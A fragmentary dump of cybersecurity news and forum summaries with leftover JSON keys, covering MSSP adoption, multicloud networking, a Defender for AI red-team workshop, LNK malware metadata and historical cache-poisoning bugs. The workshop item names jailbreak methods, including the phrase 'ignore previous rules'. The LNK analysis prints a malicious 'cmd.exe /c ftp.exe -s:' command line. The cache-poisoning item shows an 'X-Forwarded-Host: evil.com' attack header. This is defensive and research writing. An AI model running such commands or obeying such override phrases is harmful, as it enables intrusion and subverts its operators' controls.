sondern auch damit, zeitnah auf Vorf\u00e4lle zu reagieren oder mit den Compliance-Anforderungen Schritt zu halten, ist das ebenfalls ein Warnsignal f\u00fcr akuten MSSP-Bedarf. Ensar Seker , CISO beim Sicherheitsanbieter SOCRadar, erl\u00e4utert, welche Folgen in so einem Fall drohen: \u201cWenn interne Teams von der schieren Menge der operativen Aufgaben \u00fcberw\u00e4ltigt sind und sich nicht auf die strategische Verteidigung konzentrieren k\u00f6nnen, ist Burnout unausweichlich.\u201d Laut Seker sollten Unternehmen, die MSSPs evaluieren vor allem auf Erfahrung, Transparenz und Integrationsbereitschaft achten: \u201cSuchen Sie nach Anbietern, die detaillierte SLAs, Echtzeit-Transparenz bei Warnmeldungen, klare Eskalationswege und native Integrationen bieten. Ebenso wichtig ist eine enge kulturelle und kommunikative Abstimmung. Der MSSP muss sich wie eine Erweiterung Ihres Teams anf\u00fchlen, nicht wie eine Black Box.\u201d 4. Keine internen Ressourcen Viele kleinere Unternehmen k\u00f6nnen es sich schlicht nicht leisten, ein Team von Cybersicherheitsspezialisten in Vollzeit zu besch\u00e4ftigen. Das macht diese Firmen besonders anf\u00e4llig f\u00fcr s\u00e4mtliche Arten von Cyberangriffen. Einen Managed Security Service Provider zu engagieren, bietet einen Ausweg aus dieser Situation, wie Trevor Young , Chief Product Officer bei Security Compass, erkl\u00e4rt: \u201cMSSPs k\u00f6nnen Skaleneffekte, proaktive Threat Intelligence und ein tiefgehendes Verst\u00e4ndnis der Security Best Practices bieten.\u201d Der gr\u00f6\u00dfte Fehler, den Unternehmen bei der Suche nach einem MSSP machen k\u00f6nnen, ist nach Meinung des Produktentscheiders, das als rein kostenorientierte Entscheidung zu betrachten. Weitere h\u00e4ufige Fehler sind laut Young in diesem Zusammenhang, s\u00e4mtliche Sicherheits-Tasks an einen MSSP auszulagern, ohne zuvor eine ordnungsgem\u00e4\u00dfe Due Diligence durchzuf\u00fchren: \u201cUnternehmen vers\u00e4umen es oft, ihre Sicherheitsanforderungen, die erwarteten Ergebnisse und den Umfang der Dienstleistungen klar zu definieren. Das f\u00fchrt zu falschen Erwartungen und unzureichendem Schutz.\u201d 5. Interner Wissensmangel Wenn ein internes Team immer wieder auf Fragen st\u00f6\u00dft, die es nicht einhundertprozentig beantworten kann, ist es m\u00f6glicherweise ebenfalls an der Zeit, die Hilfe eines Managed Security Provider in Anspruch zu nehmen. \u201cSelbst wenn nur in einem oder zwei Cybersecurity-Bereichen spezifisches Wissen fehlt, kann das zu erheblichen Vers\u00e4umnissen f\u00fchren und das Potenzial f\u00fcr Effizienzsteigerungen verringern\u201d, h\u00e4lt Aimee Simpson , Director beim Sicherheitsanbieter Huntress, fest. In Simpsons Erfahrung k\u00f6nnen insbesondere kleine IT-Teams in vielen F\u00e4llen bereits mit grundlegenden Cybersicherheitsaufgaben \u00fcberlastet sein. \u201cEin MSSP kann Ihr Team entlasten, sodass es sich darauf konzentrieren kann, die IT-Sicherheit zu optimieren, statt sie nur aufrechtzuerhalten.\u201d 6. Kein Schutz nach Feierabend F\u00fcr Unternehmen, die nach einer 24/7-Sicherheitsl\u00f6sung suchen, bietet ein Managed Security Service Provider eine praktische und in der Regel erschwingliche Komplettl\u00f6sung. \u201cDer Umfang der Betreuung, die ein MSSP bietet, stellt an sich bereits eine erhebliche Verbesserung der Sicherheitslage dar\u201d, meint Huntress-Managerin Simpson. CPO Young empfiehlt an dieser Stelle: \u201cSuchen Sie nach einem MSSP, der eine umfassende Palette von Dienstleistungen anbietet und der sich dazu verpflichtet, neuen Bedrohungen einen Schritt voraus zu sein.\u201d 7. Schmerzhaftes Reporting \u201cReportings stellen f\u00fcr viele Unternehmen einen erheblichen Mehraufwand dar\u201d, konstatiert Tony Anscombe , Chief Security Evangelist beim Sicherheitsdienstleister ESET. Insbesondere Unternehmen, die aufgrund ihres Standortes einer Meldepflicht von Cybervorf\u00e4llen unterliegen, m\u00fcssten unter Umst\u00e4nden ganze Teams besch\u00e4ftigen, um die damit zusammenh\u00e4ngenden Reporting-Tasks abdecken zu k\u00f6nnen. \u201cDiese Belastung l\u00e4sst sich wahrscheinlich am effizientesten durch einen Managed Security Service Provider oder ein externes Cyber-Incident-Response-Team bew\u00e4ltigen, das mit den spezifischen Berichtsmethoden und -anforderungen vertraut ist\u201d, meint der Sicherheitsexperte. Dar\u00fcber hinaus ist Anscombe der Ansicht, dass ein gutes MSSP-Paket neben Meldepflichten und Reportings auch einen Incident-Response-Plan und regelm\u00e4\u00dfiges Security-Testing umfassen sollte: \u201cSo l\u00e4sst sich sicherzustellen, dass Patches und Software-Updates schnell und effektiv angewendet werden.\u201d (fm) Sie wollen weitere interessante Beitr\u00e4ge rund um das Thema IT-Sicherheit lesen?

      "summary": "Hello cyber folks! Curious of the community\u2019s thoughts on a thought experiment i\u2019ve been having: Say I have a reverse proxy (RP) on my network brokering a service i\u2019m running. I see 3 deployment options: Use two separate physical servers. One to run the RP, and another to run the service. Connected via a layer-2 switch, router-on-a-stick, and upstream firewall. Use a hypervisor, run the RP on the same physical server as the service, but each within their own VM. Use containers, run the RP & service on the same physical server & OS (baremetal Debian for example) and use a docker bridge network to connect the two. ~~~~~~~~~~~~~~~~~~~~~~~~~ In terms of security, i think 1 is the best, 2 is almost identical to 1 except for the threat of VM escape, and 3 is the least secure but potentially still production-viable if configured properly. I\u2019d love to hear your thoughts on what\u2019s best and the security implications of each. Also if you\u2019d change anything about the deployment options above!

      "title": "Expanding Google Cloud\u2019s Cross-Cloud Network with a groundbreaking AWS collaboration",
      "summary": "Today, we announced a significant collaboration with Amazon Web Services (AWS) to offer a managed, private and secure, on-demand, solution for cross-cloud connectivity . This solution is designed to enable customers to easily build enterprise-grade applications that span both Google Cloud and AWS environments. This collaboration is particularly timely, as the adoption of multicloud applications is rapidly accelerating, driven in part by the rise of AI. A Forbes survey highlighted that 82% of respondents anticipate that the arrival of AI services will increase the demand for multicloud networking due to the scarcity of specialized accelerator resources and the availability of diverse AI agents across different vendors. The surge in multicloud adoption is a strategic imperative for organizations looking to build agentic AI applications, optimize workloads, access best-of-breed services, meet data residency requirements, and ensure the necessary resiliency for modern hybrid and multicloud applications. To address the inherent network infrastructure challenges introduced by multicloud deployments, we designed the Cross-Cloud Network to simplify and optimize networking between Google Cloud and other providers.This commitment to multicloud integration has led to over 50% of the Fortune 500 currently using the Cross-Cloud Network, and this collaboration provides a significant boost. importantly, this new jointly engineered solution with AWS is being published under an open specification , creating an opportunity to expand the reach, allowing other providers to contribute and implement this solution in their own environments, further benefiting mutual customers. Introducing the Cross-Cloud Interconnect for AWS Today marks a major step in simplifying and securing the multicloud journey. We are thrilled to announce a first of its kind open specification that fundamentally streamlines private network connections between customers' environments across different cloud providers. This groundbreaking joint specification has culminated in the preview of partner Cross-Cloud Interconnect for AWS , a powerful expansion of our Cloud Interconnect portfolio. This innovation allows you to build on-demand connections in minutes between your Google Cloud and AWS VPCs, transforming multicloud networking from a complex build into a simple, managed service. This is more than just a connection \u2014 it's a complete shift in how you adopt multicloud solutions. We are delivering substantial value to our mutual customers: Simplicity and speed: Say goodbye to complex networking builds. This is a fully managed, cloud-native experience where a cross-cloud connection is as easy as peering two VPCs. We're cutting end-to-end setup time from days to mere minutes , with flexible, on-demand bandwidth starting at 1 Gbps during preview and scaling up to 100 Gbps at general availability. Secure by default: Your data's security is paramount. All connections between the two clouds' edge routers are MACsec-encrypted \u2014 providing line-rate performance with always-on encryption \u2014 for a more secure foundation. Inherently resilient: Benefit from an inherently resilient architecture that provides layers of protection against facility, network, and software failures, ensuring your critical applications remain online. Open and optimized: The foundation is an open specification for seamless adoption across the industry. You can also benefit from an optimized t otal cost of ownership through vendor consolidation and an on-demand service model that lets you provision exactly what you need, when you need it. This service is launching with availability in key locations like N. Virginia, Oregon, London, and Frankfurt, with rapid expansion planned to more locations globally. Simplifying cross-cloud connectivity Before today's jointly engineered solution, building applications that spanned multiple cloud environments was a significant undertaking, often becoming a barrier to multicloud adoption. Customers faced a complex, multi-layered process that involved cross-functional teams and substantial lead times. A typical deployment required several intricate steps: Procurement: Acquiring physical connections, whether dedicated or through a shared partner offering, and then building and managing the necessary infrastructure to ensure network availability and separation of fate. Logical configuration: Establishing basic connectivity by meticulously assigning and negotiating non-overlapping link-local IP addresses and setting up VLANs. Routing setup: Configuring BGP sessions, assigning Autonomous System (AS) numbers, and creating complex routing policies to meet specific performance and reliability requirements. Security implementation: Conducting thorough security reviews and implementing custom solutions to encrypt traffic between the distinct cloud environments. The integrated partner Cross-Cloud Interconnect offering completely abstracts away this complexity. Customers can now bypass all the manual steps and instantly leverage pre-built physical connections with built-in security and resiliency, achieving streamlined, on-demand connectivity between their Google Cloud VPCs and AWS. Building this powerful cross-cloud connection is now remarkably simple. Customers configure a single \"transport\" resource in Google Cloud and accept it in AWS. This transport is an innovative, managed construct that completely abstracts and provisions the underlying physical interconnects, VLAN attachments, and Cloud Router instances. This profound simplification enables end-to-end connectivity in minutes , transforming multicloud deployment from a days-long engineering project into a simple, rapid configuration task. Under the hood: a secure and resilient foundation We co-designed our solution to deliver a secure and resilient foundation for cross-cloud applications, with a simple new service that doesn\u2019t compromise on core enterprise availability tenets. Privacy and security : All peering relationships are built between link local addresses, facilitating connectivity between IPv4 and IPv6 private address spaces across both environments. All underlying physical connections between Google Cloud and AWS edge routers are MACsec-encrypted, and both providers manage key rotation to meet enterprise security requirements. Quad-redundancy: To enable connectivity between a Google Cloud and an AWS cloud region, quad-redundant connections are leveraged, ensuring facility redundancy, as well as edge-router redundancy. This design helps protect from multiple simultaneous failure scenarios and provides high resiliency levels for joint customers. Managed operations are key to enabling integrated solutions. The newly introduced solution not only streamlines the physical and logical builds on behalf of joint customers, it also leverages a robust underlying proactive monitoring system that detects and reacts to failures before customers suffer from their consequences. The system relies on coordinated maintenance to avoid overlaps that may impact end-to-end service availability, and streamlines support operations to address potential issues on behalf of customers. A variety of multicloud workloads These new streamlined network connections between Google Cloud and AWS enable application teams to automate network builds for a variety of interesting applications. Consider the following scenarios: Infrastructure and AI deployments supporting active-active or active-standby disaster recovery strategies. With basic connectivity between two peer services \u2014 e.g., agentic AI applications or database replicas \u2014 applications can synchronize state across the cloud boundary as if they are co-located, supporting maximum application resilience and operational consistency. AWS customers issuing inbound requests into Google Cloud to allow a service running in AWS to securely and privately access a Google Cloud API. Examples include custom applications running on Compute Engine or a critical data warehouse hosted in BigQuery that bypasses the public internet for enhanced security and performance. Google Cloud customers issuing outbound requests towards AWS, where a data pipeline orchestrating in Google Cloud can privately pull large datasets from an AWS datastore like S3 or an RDS instance. Build applications across Google Cloud and AWS today Regardless of your use case, if your organization would benefit from simple, secure, and robust on-demand connectivity between your Google Cloud and AWS environments, we invite you to start building your applications across clouds and let us manage your network connectivity infrastructure for you. This collaboration is not restricted to Google Cloud and AWS. We invite other cloud and service providers to offer their customers this streamlined private peering capability with Google Cloud. To learn more, check out the open specification , and contact us at cross-cloud@google.com. We are truly excited to grow this ecosystem for the benefit of our joint customers.",

      "title": "AWS and Google Cloud collaborate to simplify multicloud networking",
      "summary": "As organizations increasingly adopt multicloud architectures, the need for interoperability between cloud service providers has never been greater. Historically, however, connecting these environments has been a challenge, forcing customers to take a complex \"do-it-yourself\" approach to managing global multi-layered networks at scale. To address these challenges and advance a more open cloud environment, Amazon Web Services (AWS) and Google Cloud collaborated to transform how cloud service providers could connect with one another in a simplified manner. Today, AWS and Google Cloud are excited to announce a jointly engineered multicloud networking solution that uses both AWS Interconnect - multicloud and Google Cloud\u2019s Cross-Cloud Interconnect . This collaboration also introduces a new open specification for network interoperability, enabling customers to establish private, high-speed connectivity between Google Cloud and AWS with high levels of automation and speed. \u201cIntegrating Salesforce Data 360 with the broader IT landscape requires robust, private connectivity. AWS Interconnect - multicloud allows us to establish these critical bridges to Google Cloud with the same ease as deploying internal AWS resources, utilizing pre-built capacity pools and the tools our teams already know and love. This native, streamlined experience \u2014 from provisioning through ongoing support \u2014 accelerates our customers' ability to ground their AI and analytics in trusted data, regardless of where it resides.\u201d - Jim Ostrognai, SVP Software Engineering, Salesforce Previously, to connect cloud service providers, customers had to manually set up complex networking components including physical connections and equipment; this approach required lengthy lead times and coordinating with multiple internal and external teams. This could take weeks or even months. AWS had a vision for developing this capability as a unified specification that could be adopted by any cloud service provider, and collaborated with Google Cloud to bring it to market. Now, this new solution reimagines multicloud connectivity by moving away from physical infrastructure management toward a managed, cloud-native experience. By integrating AWS with Google Cloud\u2019s Cross-Cloud Network architecture, we are abstracting the complexity of physical connectivity, network addressing, and routing policies. Customers no longer need to wait weeks for circuit provisioning: they can now provision dedicated bandwidth on demand and establish connectivity in minutes through their preferred cloud console or API. Reliability and security are the cornerstone of this collaboration. We have collaborated on this solution to deliver high resiliency by leveraging quad-redundancy across physically redundant interconnect facilities and routers. Both providers engage in continuous monitoring to proactively detect and resolve issues. And this solution is built on a foundation of trust, utilizing MACsec encryption between the Google Cloud and AWS edge routers. \u201cThis collaboration between AWS and Google Cloud represents a fundamental shift in multicloud connectivity. By defining and publishing a standard that removes the complexity of any physical components for customers, with high availability and security fused into that standard, customers no longer need to worry about any heavy lifting to create their desired connectivity. When they need multicloud connectivity, it's ready to activate in minutes with a simple point and click.\u201d - Robert Kennedy, VP of Network Services, AWS \u201cWe are excited about this collaboration which enables our customers to move their data and applications between clouds with simplified global connectivity and enhanced operational effectiveness. Today's announcement further delivers on Google Cloud\u2019s Cross-Cloud Network solution focused on delivering an open and unified multicloud experience for customers.\u201d - Rob Enns, VP/GM of Cloud Networking, Google Cloud This collaboration between AWS and Google Cloud is more than a multicloud solution: it\u2019s a step toward a more open cloud environment. The API specifications developed for this product are open for other providers and partners to adopt, as we aim to simplify global connectivity for everyone. We invite you to explore this new capability today.

      "title": "Defender for AI services: Threat Protection and AI red team workshop",
      "summary": "Generative AI is reshaping how enterprises operate, introducing new efficiencies\u2014and new risks. Imagine launching a helpful chatbot, only to learn a cleverly crafted prompt can bypass safety controls and exfiltrate sensitive data. This is today\u2019s reality: every system prompt, plugin/tool, dataset, fine\u2011tune, or orchestration step can change the attack surface. This is due to the non deterministic nature in how LLM models craft responses in output. The slightest change in the input of a prompt in verbiage or tone can change the outcome of a output in subtle but non predictable ways especially when your data is involved. This post shows how to operationalize AI red teaming with Microsoft Defender for AI services so security teams gain evidence\u2011backed visibility into adversarial behavior and turn that visibility into daily defense. By aligning with Microsoft\u2019s Responsible AI principles of transparency, accountability, and continuous improvement, we demonstrate a pragmatic, repeatable loop that makes AI safer week after week. Crucially, security needs to have a seat at the table across the AI app lifecycle from model selection and pilot to production and ongoing updates. Who Should Read This (and What You\u2019ll See) SOC analysts & incident responders - See how AI signals materialize as high\u2011fidelity alerts (prompt evidence, URL intel, identity context) in Defender for Cloud and Defender XDR for fast triage and correlation. AI/ML engineers - Validate model safety with controlled simulations (PyRIT\u2011informed strategies) and understand which filters/guardrails move the needle. Security architects - Integrate Microsoft Defender for AI services into your cloud security program; codify improvements as policy, IaC, and identity hygiene. Red teamers/researchers - Run structured, repeatable adversarial tests that produce measurable outcomes the org can act on. Why now? Data leakage, prompt injection, jailbreaks, and endpoint abuse are among the fastest\u2011growing threats to AI systems. With AI red teaming and Microsoft Defender for AI services, you catch intent before impact and translate insight into durable controls. What\u2019s Different About the AI Attack Surface New risks sit alongside the traditional ones: Prompts & responses \u2014 Susceptible to prompt injection and jailbreak attempts (rule change, role\u2011play, encoding/obfuscation). User & application context \u2014 Missing context slows investigations and blurs accountability. Model endpoints & identities \u2014 Static keys and weak identity practices increase credential theft and scripted probing risk. Attached data (RAG/fine\u2011tuning) \u2014 Indirect prompt injection via documents or data sources. Orchestration layers/agents \u2014 Tool invocation abuse, unintended actions, or \u201cover\u2011permissive\u201d chains. Content & safety filters \u2014 Configuration drift or silent loosening erodes protection. A key theme across these risks is context propagation. The way user identity, application parameters, and environmental signals travel with each prompt and response. When context is preserved and surfaced in security alerts, SOC teams can quickly correlate incidents, trace attack paths, and remediate threats with precision. Effective context propagation transforms raw signals into actionable intelligence, making investigations faster and more accurate. Microsoft Defender for AI services adds a real\u2011time protection layer across this surface by combining Prompt Shields, activity monitoring, and Microsoft threat intelligence to produce high\u2011fidelity alerts you can operationalize. The Improvement Loop (Responsible AI in Practice) Responsible AI comes to life when teams Observe \u2192 Correlate \u2192 Remediate \u2192 Retest \u2192 Codify: Observe controlled jailbreak/phishing/automation patterns and collect prompt evidence. Correlate with identity, network, and prior incidents in Defender XDR. Remediate with the smallest effective control (filters, identities, rate limits, data scoping). Retest the same scenario to verify risk reduction. Codify as baseline (policy, IaC template, guardrail profile, rotation notes). Repeat this rhythm on a schedule and you\u2019ll build durable posture faster than a one\u2011time \u201cbig\u2011bang\u201d control set. Prerequisites: To take advantage of this workshop you\u2019ll need: Sandbox subscription (ideally inside a Sandbox Mgmt Group with lighter policies), you may also leverage a Free trial of Azure Subscription as well. Microsoft Defender for AI services plan enabled (see Participant Guide ) Contributor access (you can deploy + view alerts) Region capacity confirmed (Azure AI Foundry in East US 2) Workshop flow and testing: Prep: Enable the Microsoft Defender for AI services plan with prompt evidence, deploy the Azure Template (one hub + single endpoint), and open the AIRT-Eval.ipynb notebook; you now have a controlled space to generate signals(see Participant Guide ). Controlled Signals: Trigger against a jailbreak attempt, a phishing URL simulation, and a suspicious user agent simulation to produce three distinct alert types. Triage & Correlate: For each alert, review anatomy (evidence, severity, IDs) and capture prompt/URL evidence. Harden & Retest: Apply improvements or security controls, then validate fixes. After you harden controls and retest, the next step is validating that your defenses trigger the right alerts on demand. There is a list of Microsoft Defender for AI services alerts here. To evaluate alerts, open DfAI\u2011Eval.ipynb - a streamlined notebook that safely simulates adversarial activity (current alerts: jailbreak, phishing URL, suspicious user agent) to exercise Microsoft Defender for AI services detections. Think of it as the EICAR test for AI workloads: consistent, repeatable, and safe. Next, we will review and break down each of the alerts you\u2019ll generate in the workshop and how to read them effectively. Anatomy of Jailbreak from AI Red team Agent: A jailbreak is a user prompt designed to sidestep system or safety instructions\u2014rule\u2011change (\u201cignore previous rules\u201d), fake embedded conversation, role\u2011play as an unrestricted persona, or encoding tricks. Microsoft Defender for AI services (via Prompt Shields + threat intelligence) flags it before unsafe output (\u201cleft\u2011of\u2011boom\u201d) and publishes a correlated high\u2011fidelity alert into Defender XDR for cross\u2011signal investigation. Anatomy of a Phishing involved in an attack: Phishing prompt URL alerts fire when a prompt or draft response embeds domains linked to impersonation, homoglyph tricks, newly registered infrastructure, encoded redirects, or reputation\u2011flagged hosting. Microsoft Defender for AI services enriches the URL (normalization, age, reputation, brand similarity) and\u2014if prompt evidence is enabled\u2014includes the exact snippet, then streams the alert into Defender XDR where end\u2011user/application context fields (e.g. `EndUserId`, `SourceIP`) let analysts correlate repeated lure attempts and pivot to related credential or jailbreak activity. Anatomy of a User Agent involved in an attack: Suspicious user agent alerts highlight enumeration or automation patterns (generic library signatures, headless runners, scanner strings, cadence anomalies) tied to AI endpoint usage and identity context. Microsoft Defender for AI services scores the anomaly and forwards it to Defender XDR enriched with optional `UserSecurityContext` (IP, user ID, application name) so analysts can correlate rapid probing with concurrent jailbreak or phishing alerts and enforce mitigations like managed identity, rate limits, or user agent filtering. Conclusion The goal of this Red teaming and AI Threat workshop amongst the different attendees is to catch intent before impact, prompt manipulation before unsafe output, phishing infrastructure before credential loss, and scripted probing before exfiltration. Microsoft Defender for AI services feeding Defender XDR enables a compact improvement loop that converts red team findings into operational guardrails. Within weeks, this cadence transforms AI from experimental liability into a governed, monitored asset aligned with your cloud security program. Incrementally closing gaps within context propagation, identity hygiene, Prompt Shields & filter tuning\u2014builds durable posture. Small, focused cycles win ship one improvement, measure its impact, promote to baseline, and repeat.",

      "title": "Intel in LNK Files",
      "summary": "I was reading a pretty interesting write-up from Seqrite regarding, in part, the use of pseudo-polyglot documents. In this case, delivery occurred via ZIP archive that contains an LNK file and a PNG file. The PNG file is pseudo-polyglot file in question; the binary contents contain a series of commands to be executed via ftp.exe , followed by what appears to be a PDF document. The attack is initiated when the target user double clicks the LNK file; I'll leave the rest of the description to the author. I will say that I'm not used to the author's writing style, so it took me a bit of effort to get used to it, and to get a better view of what the author was trying to share. However, what did interest me more was that the threat actor's efforts included an LNK, something that had to be created on the threat actor's infrastructure before it was included in the archive. As such, from an intel perspective, LNK files are \"free money\", and something I've talked about here in this blog more than a few times. Using the hash provided in the write-up, I was able to find a sample to download and parse myself. The LNK file itself had very little actual metadata beyond what was shared in the write-up, but that was still very interesting to me. Take a look at the full set of metadata: guid {00021401-0000-0000-c000-000000000046} shitemidlist My Computer/C:\\/Windows/system32/cmd.exe **Shell Items Details (times in UTC)** C:0 M:0 A:0 Windows (9) C:0 M:0 A:0 system32 (9) C:0 M:0 A:0 cmd.exe (9) commandline /c ftp.exe -s:\"offsec-certified-professional.png\" iconfilename %ProgramFiles(x86)%\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe hotkey 0x0 showcmd 0x1 ***LinkFlags*** HasLinkTargetIDList|IsUnicode|HasArguments|HasIconLocation ***PropertyStoreDataBlock*** GUID/ID pairs: {46588ae2-4cbc-4338-bbfc-139326986dce}/4 SID: S-1-5-21-1526495471-1806070692-3097244026-1000 ***KnownFolderDataBlock*** GUID : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7} Folder: CSIDL_SYSTEM We can see that the shell item time stamps are zero'd out, there's no machineID or NetBIOS name listed, no volume serial number, etc. The dearth of metadata can be just as important, or even more so, than when an LNK file contains much more metadata. My most recent blog post on LNK file metadata , prior to this post, illustrates an LNK file that is rife with metadata. So, the LNK file used in the Seqrite campaign may be the result of using a specific tool to create the LNK file, or it may be the result of applying a process to the LNK file, after it was created, to \"scrub\" a lot of the metadata that we might expect to see. Either way, tracking this information can be very valuable for CTI teams, as the available metadata tells us something about the adversary. Also, strings such as the SID shown can be used to search for other, similar samples, in an effort to round out the adversary's intel picture.",

Even with constant-time code and zeroization routines, the moment a key touches conventional memory, it becomes part of the microarchitectural threat surface. I\u2019ve been working on a CMOS-compatible primitive called Atomic Memory\u2122 (also known as Read-Only-Once Memory, ROOM ) that enforces deterministic single-read semantics at the circuit level. When a secret is read once, the storage element physically collapses and becomes unrecoverable. The key literally cannot be read a second time \u2014 even after reset, power-cycling, or attacks on the microarchitecture. Because secrets never enter normal RAM, caches, speculative buffers, or DMA-accessible regions, it inherently prevents entire attack classes: Spectre/Meltdown-style transient execution leakage Cold-boot attacks and DRAM remanence extraction DMA/PCIe/Thunderbolt snooping Rowhammer disturbance/fault-induced reads Cache line scavenging & microarchitectural side channels Register remanence from imperfect zeroization Flash-based key provisioning leakage Firmware rollback replays to re-extract keys The only secure key is the one that no longer exists \u2014 and here, the hardware ensures that.

They\u2019re all in version 0.1.0 , fully CLI, functional \u2014 but definitely still maturing. I\u2019m sharing them here because I\u2019d really appreciate feedback, critiques, and suggestions from more experienced people in the field. They include AI-assisted reporting (technical/executive) , but that feature is still in its early stages and is more aligned with what I want to expand in the future. This is 100% non-commercial . If any of these tools is useful for learning or experimenting, that alone would make me happy. \ud83d\udd27 The Tools (all open-source) 1. Pythia \u2013 SQL Injection Clairvoyance Scanner Automated SQLi detection (boolean, error-based, time-based), payload rotation, diff-based analysis. GitHub: https://github.com/rodhnin/pythia-sql-clairvoyance 2. Asterion \u2013 Network & Domain Security Auditor (Minotaur Series) Multi-protocol auditing (SMB, RDP, LDAP/AD, Kerberos, SSH, DNS, SNMP) + Windows/Linux system checks. GitHub: https://github.com/rodhnin/asterion-network-minotaur (This one is my personal favorite and the most polished \u2014 it was the last one I built.) 3. Argus \u2013 WordPress Vulnerability Watcher Plugin/theme enumeration, version fingerprinting, misconfig checks, permission issues, authentication checks, etc. GitHub: https://github.com/rodhnin/argus-wp-watcher 4. Hephaestus \u2013 Server Forge Auditor (Apache/Nginx) Config/baseline checks, directory exposure, basic SSL tests, permissions, and hardening suggestions. GitHub: https://github.com/rodhnin/hephaestus-server-forger \ud83e\uddea Testing Labs (Important) I created small local testing labs for experimenting with all four tools. I strongly recommend using them primarily in labs because: The scanners are aggressive in their default configuration. They do not cause DoS , but they will generate alerts due to the volume of requests. Future versions will include better optimization, throttling, and adaptive scanning. Please keep things ethical and controlled when testing. \ud83d\udcc4 Documentation Note Since I worked completely alone, I relied on AI assistance to help draft and organize some parts of the documentation. I personally reviewed everything, but if anyone notices: inconsistencies unclear wording missing details anything suspicious please let me know \u2014 I\u2019ll update it immediately. Feedback is genuinely appreciated. \ud83e\udded Planned Roadmap My next goal is to merge everything under a local AI auditing agent (offline-capable) that can: analyze findings automatically propose mitigation steps generate technical & executive reports learn from scan history unify the suite under a single workflow \ud83d\ude4f What kind of feedback I\u2019m looking for Detection reliability False positives / false negatives Architecture or performance ideas Security concerns Algorithmic improvements Roadmap suggestions Anything that could make the tools better Thanks to anyone willing to test, break, or critique these early versions.

      "summary": "I\u2019ve been working in MDR for about three years and I\u2019ve hit a wall. The burnout is real. I\u2019m not looking to complain \u2014 I\u2019m just trying to understand my next steps and what jobs in cybersecurity would be a better fit long-term. For context: I\u2019m very comfortable with responsibility, pressure, and handling true positives. I\u2019m conscientious, I care about getting things right, and I actually enjoy the investigative side. That\u2019s not the issue. The issue is the lack of control and constant unpredictability baked into MDR. The nonstop queues, sudden escalations, constantly shifting priorities, and being judged more on speed than quality \u2014 it\u2019s draining me at this point. I don\u2019t feel valued, and the emotional toll is adding up. After 3 years of doing this full-time, I\u2019m genuinely burned out. I\u2019m not super in tune to my own emotions and feelings - I\u2019ve been feeling this way for a while but it\u2019s been so gradual I never really noticed. I\u2019m the sole income for my family, so I can\u2019t take risky leaps or big pay cuts. I need stability, predictability, and a role where effort = outcome, not chaos = outcome. My goal: Find a remote cybersecurity role that is lower-stress, more structured, and pays enough for me to take home about $5,000/month (~75k gross would do this for me) after taxes. I know that\u2019s achievable in this field \u2014 I just don\u2019t know the best paths to transition into. I\u2019m looking for advice from people who have moved out of MDR/SOC into: \u2022 GRC \u2022 IAM \u2022 Vulnerability Management \u2022 Endpoint Security \u2022 Cloud security posture \u2022 Security awareness \u2022 Any stable non-reactive security roles How did you pivot? What skills did you highlight? Who\u2019s hiring remote for these roles right now? Anything I should do or avoid during the transition? Any guidance from people who\u2019ve been through this would be huge. I\u2019m at the point where I need a sustainable path forward in this industry, not another year of running on fumes. Thanks in advance. I expect the most common feedback will be to grind it out until the job market recovers. I know it\u2019s competitive for all roles, especially remote ones. submitted by /u/Bulky-Economy8565 [link] [comments]",

      "summary": "Hi everyone, I've been doing a deep dive into Cache Poisoning to understand how the vulnerability class has evolved over the last decade. While modern attacks involve complex gadgets and framework confusion, I realized that to truly understand them, you have to look at the \"Foundational\" attacks\u2014the early logic flaws that started it all. I analyzed 8 historical case studies from public bug bounty reports. Here are the 3 most interesting patterns that paved the way for modern exploitation: 1. The HackerOne Classic (2014) The Flaw: The server trusted the X-Forwarded-Host header without validation. The Attack: Sending X-Forwarded-Host: evil.com caused the application to generate a redirect to the attacker's domain. The Impact: The cache stored this redirect. Any legitimate user trying to visit HackerOne was seamlessly redirected to the attacker's site. 2. GitHub's Content-Type DoS The Flaw: GitHub handled Content-Type headers differently for the cache vs. the backend. The Attack: An attacker could send a request with a malformed content type. The backend would return an error, but the cache would store that error for all unauthenticated users visiting that repo. The Result: A simple request could DoS a repository for everyone. 3. The Cloudflare Capitalization Bug The Flaw: Cloudflare normalized headers (converting TaRgEt.CoM to target.com for the cache key), but the origin server treated them as distinct. The Impact: This allowed attackers to bypass cache keys and poison the response for a massive number of websites behind the CDN. Why this matters today: Even though these are \"old\" reports, these exact logic flaws (normalization issues, unkeyed headers) are what cause the complex CP-DoS and secondary-context attacks we see in modern frameworks like Next.js today. I wrote a full breakdown of all 8 case studies (including Shopify, GitLab, and Red Hat) if you want to see the specific request/response pairs. Read the Full Analysis (Part 1) Let me know if you have any questions about the mechanics of these early bugs! submitted by /u/Empty_Hacker [link] [comments]",

If you prefer watching a video: https://youtu.be/8DBvjSm0KZM LinkedIn post: HERE X/Twitter post: HERE BSky: HERE Website link: https://lumen.koifsec.me Repo: https://github.com/Koifman/LUMEN Traditional EVTX Analysis Windows Event Logs (EVTX) are the backbone of incident response, threat hunting, and forensic investigations. LUMEN was built to enhance working with EVTX files. It delivers high-grade EVTX analysis directly inside your browser \u2014 no installation, no backend servers, no log uploads. Architecture: Privacy-First by Design At its core, LUMEN is built around one guiding principle: Your logs never leave your machine. WebAssembly-Powered Parsing LUMEN uses a Rust-based EVTX parser compiled to WebAssembly, built on the battle-tested omerbenamram/evtx project. This enables: High-speed performance Full support for binary templates and compression Automatic format detection (binary .evtx or XML) ~100% successful parsing rate on valid files This is a massive leap beyond regex-based or partial parsers that routinely fail on real-world logs. True Client-Side Processing Every stage of processing happens inside your browser: EVTX parsing SIGMA rule execution Event correlation Timeline generation IOC extraction AI analysis (opt-in only) There is no server-side processing, no telemetry, and no third-party storage involved. Core Capabilities 1. SIGMA Threat Detection (2,349 Rules) LUMEN ships with 2,349 production-ready official SIGMA detection rules covering: Process execution anomalies Lateral movement techniques Credential access patterns Defense evasion Persistence mechanisms Command & Control behavior 2. AI-Powered Analysis (Optional & Controlled) LUMEN integrates with leading AI platforms: OpenAI Anthropic Google Capabilities: Natural-language log queries Automated incident summaries Pattern anomaly detection Executive-level reporting AI only sees the data you explicitly share. Nothing is sent without your consent. 3. Event Correlation Engine Understanding attacks requires connecting signals across time and systems. LUMEN reconstructs: Process trees User movement & privilege escalation Network activity chains Time-based clustering Attack flows are visualized as correlation tables , turning chaos into clarity. 4. IOC Extraction LUMEN automatically extracts, categorizes, and deduplicates: IP addresses Domains URLs File hashes Registry keys File paths Email addresses All indicators are exportable for threat intel feeds or SIEM ingestion . 5. Visual 